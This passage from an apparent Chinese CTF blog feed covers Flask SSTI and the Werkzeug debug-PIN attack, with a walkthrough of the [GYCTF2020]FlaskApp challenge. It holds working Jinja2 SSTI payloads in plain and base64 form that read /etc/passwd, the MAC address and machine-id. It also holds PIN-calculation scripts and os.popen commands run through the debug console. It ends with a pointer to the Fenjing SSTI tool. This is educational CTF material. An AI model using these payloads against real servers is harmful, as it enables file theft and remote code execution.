</span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p>还有个老版本的<code>werkzeug 1.0.x</code>的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"> </span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span>  <span class="comment"># username 可通过/etc/passwd获取</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># modname默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># 默认值 getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span>  <span class="comment"># 路径 可报错得到  getattr(mod, &#x27;__file__&#x27;, None)</span></span><br><span class="line">]</span><br><span class="line"> </span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;25214234362297&#x27;</span>,  <span class="comment"># /sys/class/net/eth0/address mac地址十进制</span></span><br><span class="line">    <span class="string">&#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;</span>  <span class="comment"># /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 下面为源码里面抄的，不需要修改</span></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"> </span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"> </span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p>关于mac转换10进制脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">mac_to_decimal</span>(<span class="params">mac_address</span>):</span><br><span class="line">    hex_str = mac_address.replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    decimal = <span class="built_in">int</span>(hex_str, <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> decimal</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例</span></span><br><span class="line">mac = <span class="string">&quot;02:42:ac:10:ab:40&quot;</span></span><br><span class="line">result = mac_to_decimal(mac)</span><br><span class="line"><span class="built_in">print</span>(result)  <span class="comment"># 输出: 2485377870656</span></span><br></pre></td></tr></table></figure><p>对于Windows还原起来稍微麻烦，这里可以看一下现成的例题</p><h2 id="例题FlaskApp"><a href="#例题FlaskApp" class="headerlink" title="例题FlaskApp"></a>例题FlaskApp</h2><p>[GYCTF2020]FlaskApp - <a href="https://buuoj.cn/challenges#[GYCTF2020]FlaskApp">https://buuoj.cn/challenges#[GYCTF2020]FlaskApp</a><br>首页直接就提示pin<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250702182532.png"><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250702182546.png"><br>在解密页，随便输入点垃圾数据，就会弹出debug的报错，并且还可以看到他的部分源码<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250702182745.png"><br>发现他是先解密之后通过<code>render_template_string(tmp)</code>进行渲染，下面组装一个可以读取文件的payload，通过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()&#125;&#125;</span><br><span class="line">e3snJy5fX2NsYXNzX18uX19iYXNlX18uX19zdWJjbGFzc2VzX18oKX19</span><br></pre></td></tr></table></figure><p>发现只要是运行<code>__subclasses__()</code>返回就是502，这里不和多废话，直接通过通用payload拿到他这个程序的源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;app.py&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignYXBwLnB5JywncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9</span><br></pre></td></tr></table></figure><p>拿到的源码(源码返回的是html编码，需要用赛博厨子解码一下)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template, request, flash, redirect, url_for</span><br><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;s_e_c_r_e_t_k_e_y&quot;</span></span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NameForm</span>(<span class="title class_ inherited__">FlaskForm</span>):</span><br><span class="line">    text = StringField(<span class="string">&quot;BASE64加密&quot;</span>, validators=[DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">&quot;提交&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NameForm1</span>(<span class="title class_ inherited__">FlaskForm</span>):</span><br><span class="line">    text = StringField(<span class="string">&quot;BASE64解密&quot;</span>, validators=[DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">&quot;提交&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">        black_list = [</span><br><span class="line">            <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">            <span class="string">&quot;os&quot;</span>,</span><br><span class="line">            <span class="string">&quot;system&quot;</span>,</span><br><span class="line">            <span class="string">&quot;popen&quot;</span>,</span><br><span class="line">            <span class="string">&quot;import&quot;</span>,</span><br><span class="line">            <span class="string">&quot;eval&quot;</span>,</span><br><span class="line">            <span class="string">&quot;chr&quot;</span>,</span><br><span class="line">            <span class="string">&quot;request&quot;</span>,</span><br><span class="line">            <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">            <span class="string">&quot;commands&quot;</span>,</span><br><span class="line">            <span class="string">&quot;socket&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hex&quot;</span>,</span><br><span class="line">            <span class="string">&quot;base64&quot;</span>,</span><br><span class="line">            <span class="string">&quot;*&quot;</span>,</span><br><span class="line">            <span class="string">&quot;?&quot;</span>,</span><br><span class="line">        ]</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> black_list:</span><br><span class="line">            <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>.lower():</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @app.route(<span class="params"><span class="string">&quot;/hint&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hint</span>():</span><br><span class="line">        txt = <span class="string">&quot;失败乃成功之母！！&quot;</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;hint.html&quot;</span>, txt=txt)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encode</span>():</span><br><span class="line">        <span class="keyword">if</span> request.values.get(<span class="string">&quot;text&quot;</span>):</span><br><span class="line">            text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">            text_decode = base64.b64encode(text.encode())</span><br><span class="line">            tmp = <span class="string">&quot;结果 :&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(text_decode.decode()))</span><br><span class="line">            res = render_template_string(tmp)</span><br><span class="line">            flash(tmp)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;encode&quot;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            text = <span class="string">&quot;&quot;</span></span><br><span class="line">            form = NameForm(text)</span><br><span class="line">            <span class="keyword">return</span> render_template(</span><br><span class="line">                <span class="string">&quot;index.html&quot;</span>, form=form, method=<span class="string">&quot;加密&quot;</span>, img=<span class="string">&quot;flask.png&quot;</span></span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line"><span class="meta">    @app.route(<span class="params"><span class="string">&quot;/decode&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode</span>():</span><br><span class="line">        <span class="keyword">if</span> request.values.get(<span class="string">&quot;text&quot;</span>):</span><br><span class="line">            text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">            text_decode = base64.b64decode(text.encode())</span><br><span class="line">            tmp = <span class="string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(text_decode.decode())</span><br><span class="line">            <span class="keyword">if</span> waf(tmp):</span><br><span class="line">                flash(<span class="string">&quot;no no no !!&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;decode&quot;</span>))</span><br><span class="line">            res = render_template_string(tmp)</span><br><span class="line">            flash(res)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;decode&quot;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            text = <span class="string">&quot;&quot;</span></span><br><span class="line">            form = NameForm1(text)</span><br><span class="line">            <span class="keyword">return</span> render_template(</span><br><span class="line">                <span class="string">&quot;index.html&quot;</span>, form=form, method=<span class="string">&quot;解密&quot;</span>, img=<span class="string">&quot;flask1.png&quot;</span></span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line"><span class="meta">    @app.route(<span class="params"><span class="string">&quot;/&lt;name&gt;&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">not_found</span>(<span class="params">name</span>):</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;404.html&quot;</span>, name=name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>waf过滤一些内容，如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">black_list = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;os&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;import&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;chr&quot;</span>,<span class="string">&quot;request&quot;</span>,<span class="string">&quot;subprocess&quot;</span>,<span class="string">&quot;commands&quot;</span>,<span class="string">&quot;socket&quot;</span>,<span class="string">&quot;hex&quot;</span>,<span class="string">&quot;base64&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;?&quot;</span>,]</span><br></pre></td></tr></table></figure><p>其实这些单词还是比较容易绕过的，通过<code>+</code>拼接就没问题，甚至用进制的方式，这里可以通过下面的payload依次读取生成pin码所需要的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># passwd 1000 flaskweb</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL2V0Yy9wYXNzd2QnLCdyJykucmVhZCgpIH19eyUgZW5kaWYgJX17JSBlbmRmb3IgJX0=</span><br><span class="line"><span class="comment"># mac address 42:ca:61:23:36:1d</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/sys/class/net/eth0/address&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL3N5cy9jbGFzcy9uZXQvZXRoMC9hZGRyZXNzJywncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9</span><br><span class="line"><span class="comment"># host id </span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/etc/machine-id&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL3Byb2Mvc2VsZi9jZ3JvdXAnLCdyJykucmVhZCgpIH19eyUgZW5kaWYgJX17JSBlbmRmb3IgJX0=</span><br><span class="line"><span class="comment"># 读取cgroup发现不对，所以尝试machine-id 1408f836b0ca514d796cbf8960e45fa1</span></span><br></pre></td></tr></table></figure><p>除了固定的之外，在debug报错界面可以获取到app.py的绝对位置<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250702194840.png"><br><code>/usr/local/lib/python3.7/site-packages/flask/app.py</code><br>跑一下脚本(老版本的这是)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&quot;flaskweb&quot;</span>  <span class="comment"># username 可通过/etc/passwd获取</span></span><br><span class="line">    <span class="string">&quot;flask.app&quot;</span>,  <span class="comment"># modname默认值</span></span><br><span class="line">    <span class="string">&quot;Flask&quot;</span>,  <span class="comment"># 默认值 getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&quot;/usr/local/lib/python3.7/site-packages/flask/app.py&quot;</span>,  <span class="comment"># 路径 可报错得到  getattr(mod, &#x27;__file__&#x27;, None)</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&quot;73436980524573&quot;</span>,  <span class="comment"># /sys/class/net/eth0/address mac地址十进制</span></span><br><span class="line">    <span class="string">&quot;1408f836b0ca514d796cbf8960e45fa1&quot;</span>,</span><br><span class="line">    <span class="comment"># 字符串合并：首先读取文件内容 /etc/machine-id(docker不用看) /proc/sys/kernel/random/boot_id   /proc/self/cgroup</span></span><br><span class="line">    <span class="comment"># 有machine-id 那就拼接machine-id + /proc/self/cgroup  否则 /proc/sys/kernel/random/boot_id + /proc/self/cgroup</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&quot;__wzd&quot;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">    num = (<span class="string">&quot;%09d&quot;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p>即<code>594-730-022</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.popen(<span class="string">&quot;cd /;ls &quot;</span>).read()</span><br><span class="line"><span class="string">&#x27;app\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\nthis_is_the_flag.txt\ntmp\nusr\nvar\n&#x27;</span>  </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.popen(<span class="string">&quot;pwd&quot;</span>).read()</span><br><span class="line"><span class="string">&#x27;/app\n&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.popen(<span class="string">&quot;cat /this_is_the_flag.txt&quot;</span>).read()</span><br><span class="line"><span class="string">&#x27;flag&#123;d4aa5bbb-c2c7-4c02-b775-1ece8df35c88&#125;\n&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure><h1 id="通杀工具-焚靖"><a href="#通杀工具-焚靖" class="headerlink" title="通杀工具-焚靖"></a>通杀工具-焚靖</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>项目地址： <a href="https://github.com/Marven11/Fenjing.git">https://github.com/Marven11/Fenjing.git</a><br>SSTI大部分基础题目全都通杀</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install fenjing</span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fenjing webui</span><br></pre></td></tr></table></figure><p>测试题目<code>综合符号加数字过滤绕过</code><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250702201232.png"></p>]]></content>
    
    
    <summary type="html">环境创建
1
2
3


conda create -n flask python=3.11
conda activate flask
pip install flask


关于flask
Flask是一个使用python编写的轻量级的Web应用框架，其WSGI工具采用werkzeug，模板引擎使用jinja2，后面的ssti基本都围绕这flask进行。

简单案例
下面简单的创建一个flask应用

1
2
3
4
5
6
7
8
9
10
11


from flask import Flask

app = Flask(__name__)

# 路由
@app.route(&quot;/&quot;)
d</summary>
    
    
    
    <category term="CTF相关" scheme="https://blog.boychai.xyz/categories/CTF%E7%9B%B8%E5%85%B3/"/>
    
    <category term="WEB" scheme="https://blog.boychai.xyz/categories/CTF%E7%9B%B8%E5%85%B3/WEB/"/>
    
    
    <category term="CTF" scheme="https://blog.boychai.xyz/tags/CTF/"/>
    
    <category term="WEB" scheme="https://blog.boychai.xyz/tags/WEB/"/>
    
    <category term="Python" scheme="https://blog.boychai.xyz/tags/Python/"/>
    
    <category term="Flask" scheme="https://blog.boychai.xyz/tags/Flask/"/>
    
    <category term="SSTI" scheme="https://blog.boychai.xyz/tags/SSTI/"/>
    
  </entry>
  
  <entry>
    <title>WEB-PHP反序列化总结</title>
    <link href="https://blog.boychai.xyz/2025/06/24/WEB-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/"/>
